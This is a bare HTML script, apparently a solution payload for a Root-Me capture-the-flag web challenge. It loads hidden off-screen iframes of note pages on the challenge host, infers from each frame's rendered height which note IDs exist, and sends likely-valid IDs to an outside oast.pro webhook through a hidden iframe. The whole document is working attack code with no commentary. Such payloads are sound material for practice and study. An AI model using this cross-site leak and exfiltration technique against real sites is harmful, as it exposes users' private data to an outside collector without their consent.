<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";

function testRange(a = 1470, b = 1481) {
    for (let i = a; i < b; i++) {
        const iframe = document.createElement("iframe");

        iframe.src = TARGET + i;
        iframe.style.position = "absolute";
        iframe.style.left = "-9999px";
        iframe.style.width = "1000px";
        iframe.style.height = "1000px";

        iframe.onload = () => {
            const h = iframe.offsetHeight;
            console.log(h);
            if (h > 300) {
                console.log("LIKELY VALID:", i);

                const ex = document.createElement("iframe");
                ex.src = WEBHOOK + "?id=" + i;
                ex.style.display = "none";
                document.documentElement.appendChild(ex);

            }

            iframe.remove();
        };

        document.documentElement.appendChild(iframe);
    }
}

testRange();
</script>
